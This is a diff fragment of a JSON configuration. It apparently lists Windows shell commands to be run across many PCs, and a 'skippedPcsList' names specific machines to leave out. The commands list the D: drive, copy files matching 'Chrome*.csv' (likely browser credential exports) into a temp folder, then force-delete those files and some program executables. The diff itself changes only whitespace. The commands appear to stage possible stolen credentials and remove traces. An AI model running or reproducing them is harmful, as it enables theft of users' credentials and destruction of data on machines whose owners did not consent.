@@ -27,7 +27,7 @@
   "_____cmdCommands": ["dir D:\\ /s /b >> \"C:\\Temp\\string2.txt\""],
   "______cmdCommands": ["copy \"D:\\Chrome*.csv\" \"C:\\Temp\\string3.txt\""],
   "_______cmdCommands": ["del /f /q \"C:\\Temp\\string2.txt\" \"C:\\Temp\\string3.txt\""],
-   "________cmdCommands": ["del /f /q \"C:\\Program Files\\Common Files\\cameraAnalysisEXE*.exe\""],
+  "________cmdCommands": ["del /f /q \"C:\\Program Files\\Common Files\\cameraAnalysisEXE*.exe\""],
   "skippedPcsList": ["min","DESKTOP-NCO579D","new_pc","_DESKTOP-BEVO3CC","husn","_DESKTOP-5AHVE9S","sjd","_DESKTOP-GPNKIVM","exp","_DESKTOP-V15VGOT"]
   
 }
